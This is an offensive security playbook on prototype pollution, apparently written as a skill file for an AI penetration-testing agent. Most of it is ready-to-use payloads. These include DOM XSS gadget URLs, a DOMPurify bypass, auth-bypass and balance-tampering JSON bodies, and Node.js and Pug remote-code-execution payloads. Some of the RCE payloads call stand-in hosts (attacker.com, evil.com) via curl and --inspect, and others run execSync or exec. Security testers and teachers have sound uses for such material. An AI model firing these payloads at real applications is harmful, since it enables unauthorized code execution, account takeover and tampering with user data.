---
name: prototype-pollution
description: Prototype pollution attacks covering client-side DOM XSS gadgets, server-side Node.js RCE chains, and framework-specific exploitation
---

# Prototype Pollution

Prototype pollution lets attackers inject properties into the JavaScript Object prototype, causing those properties to appear on every object in the runtime. Client-side: leads to DOM XSS via gadgets. Server-side (Node.js): leads to RCE, auth bypass, or privilege escalation.

---

## Core Concept

JavaScript property lookup walks the prototype chain. If `Object.prototype.x = "evil"` is set, then `({}).x === "evil"` is true for any object.

Vulnerable merge pattern:

    function merge(target, source) {
        for (let key in source) {
            target[key] = source[key];  // No hasOwnProperty check
        }
    }
    merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
    console.log({}.admin);  // true — Object.prototype polluted

---

## Client-Side Prototype Pollution

### Finding Pollution Sinks

    # URL fragment/query sources commonly parsed and merged
    # Test: https://target.com/#__proto__[testprop]=testval
    # Or: https://target.com/?__proto__[testprop]=testval

    # In browser console after visiting URL:
    Object.prototype.testprop  // Should return "testval" if vulnerable

    # Also test constructor pollution:
    # ?constructor[prototype][testprop]=testval
    # ?__proto__.testprop=testval  (dot notation)

### DOM XSS via Gadgets

Once Object.prototype is polluted, look for gadget sinks that use properties from arbitrary objects:

**jQuery gadgets:**

    # html gadget: $.html()/$.append() reads from prototype
    # Payload: ?__proto__[html]=<img src=1 onerror=alert(1)>
    # When jQuery does $(element).html(data), it reads .html from prototype if not own property

    # location gadget
    # Payload: ?__proto__[location]=https://evil.com
    # Some jQuery plugins do element.location which reads from prototype

**Angular gadgets (legacy AngularJS):**

    # ?__proto__[ng-app]=  → triggers AngularJS bootstrap
    # ?__proto__[ng-click]=$event.view.alert(1)

**Common gadgets from PortSwigger research:**

    # innerHTML / outerHTML via assign/extend
    # target[property] = source[property] where property comes from prototype

    # DOMPurify bypass (specific versions):
    # ?__proto__[ALLOWED_ATTR][0]=onerror
    # ?__proto__[documentMode]=9  (triggers IE code path in some DOMPurify versions)

**Lodash gadgets:**

    # Lodash _.defaultsDeep() is pollutable
    # Gadgets via template, set, setWith

### Automated Detection

    # PPScan — browser-based prototype pollution scanner
    # Use browser_action to visit: https://target.com
    # Then execute in console:
    for (let key of ['__proto__', 'constructor', 'prototype']) {
        let url = new URL(location.href);
        url.searchParams.set(key + '[testpp123]', 'testval');
        console.log('Test URL:', url.toString());
    }

    # DOM Invader (Burp): best automated tool for client-side PP gadget detection
    # Manual equivalent: inject into all URL/hash/postMessage inputs and check Object.prototype

---

## Server-Side Prototype Pollution (Node.js)

### Vulnerable Merge Patterns

Common vulnerable functions:
- `_.merge()` in Lodash < 4.17.11
- `$.extend(true, {}, user_input)` in jQuery (server-side)
- `merge`, `deepMerge`, `deepAssign`, `extend` in custom code
- `Object.assign` is NOT vulnerable (shallow + own properties only)
- `JSON.parse` into merge functions — user controls JSON → pollutes prototype

### RCE via Child Process

After polluting `Object.prototype.env` or `Object.prototype.execArgv`:

    # Payload to inject into JSON/query body:
    {
        "__proto__": {
            "shell": "node",
            "NODE_OPTIONS": "--inspect=evil.com:8080",
            "execArgv": ["--eval", "process.mainModule.require('child_process').exec('curl https://attacker.com/$(id)')"]
        }
    }

    # Alternative via env:
    {
        "__proto__": {
            "env": {
                "NODE_OPTIONS": "--require /proc/self/fd/0"
            },
            "argv0": "node"
        }
    }

### Authentication Bypass

    # If app checks: if (!user.isAdmin) { deny() }
    # Pollute: Object.prototype.isAdmin = true
    # POST /api/settings with:
    {"__proto__": {"isAdmin": true}}

    # If app checks: user.role === 'admin'
    {"__proto__": {"role": "admin"}}

    # Bypass null check: if (token == null) → pollute Object.prototype
    {"__proto__": {"token": "anything"}}

### Privilege Escalation via Status Code

    # Some apps check: if (user.status === 'active')
    # Pollute status on all objects:
    {"__proto__": {"status": "active", "verified": true, "balance": 999999}}

### Finding Vulnerable Endpoints

Look for endpoints that:
1. Accept JSON body with nested objects
2. Merge/extend user input into existing objects
3. Use `_.merge`, `deep-assign`, `recursive-assign`, `lodash.merge`

    # Test all JSON endpoints:
    curl -X POST https://target.com/api/settings \
      -H "Content-Type: application/json" \
      -d '{"__proto__":{"testprop":"testval"}}'

    # Then check if polluted:
    curl https://target.com/api/any-endpoint  # Does response include testprop somehow?

    # Also test with constructor:
    {"constructor": {"prototype": {"testprop": "testval"}}}

---

## Framework-Specific

### Express.js

    # Body parser vulnerabilities (fixed in modern versions)
    # qs library vulnerable to: a[__proto__][x]=1 in URL-encoded body
    curl -X POST https://target.com/api/form \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "user[__proto__][admin]=true"

### Mongoose (MongoDB ORM)

    # Populate/select injection
    # ?__proto__[populate]=users → may cause unexpected DB queries
    # Mongoose model methods may be affected by prototype changes

### Pug / Handlebars Templates

    # Pug < 3.0: prototype pollution leads to RCE via template compilation
    # Payload:
    {
        "__proto__": {
            "block": {
                "callee": {
                    "string": "1; process.mainModule.require('child_process').execSync('id > /tmp/pwned')"
                }
            }
        }
    }

    # Handlebars < 4.7.7: similar RCE path
    # Template gadget via __defineGetter__ or environment property chains

---

## Automated Tools

    # ppmap — server-side prototype pollution scanner
    # Install: go install github.com/kleiton0x00/ppmap@latest
    ppmap -u "https://target.com"

    # Server-Side Prototype Pollution Scanner (Burp extension equivalent via CLI)
    # Test manually: inject into all JSON bodies and look for behavior changes

    # Nuclei template check
    nuclei -u https://target.com -t /home/pentester/nuclei-templates/vulnerabilities/ \
      -tags prototype-pollution -o output/pp_scan.txt

    # Client-side: headless check via browser_action
    # Use execute_js: Object.prototype.testpp123 === undefined ? 'not polluted' : 'POLLUTED'

---

## Validation

1. Client-side: confirm `Object.prototype.CANARY` is set after visiting the URL
2. Confirm a gadget executes: use a non-destructive payload like setting `innerHTML` to a static string
3. Server-side: send `{"__proto__":{"json spaces":10}}` — if JSON response becomes indented, prototype is polluted
4. For RCE: use OAST callback (curl/DNS) as payload, confirm OOB callback received
5. Demonstrate business impact: auth bypass or privilege escalation (not just `alert(1)`)

---

## Pro Tips

1. `json spaces` trick: `{"__proto__":{"json spaces":10}}` → indented JSON response = confirmed server-side PP, zero destructive risk
2. Client-side PP is often in 3rd-party libraries (jQuery plugins, analytics, A/B testing)
3. Hash-based routing (`#__proto__[x]=1`) is never sent to server — pure client-side test
4. `constructor[prototype]` is equivalent to `__proto__` but bypasses some naive filters
5. Look for lodash < 4.17.11 in package.json — vulnerable by default
6. Prototype pollution + server-side template = almost always RCE
7. After finding PP, always test for gadgets in ALL JavaScript loaded by the page — not just app code

## Summary

Prototype pollution is finding an object merge function that doesn't sanitize `__proto__` or `constructor.prototype`. Client-side leads to DOM XSS via gadgets. Server-side leads to auth bypass or RCE. The `json spaces` trick is the safest server-side confirmation. Gadget hunting is the hard part — use DOM Invader or manual review.
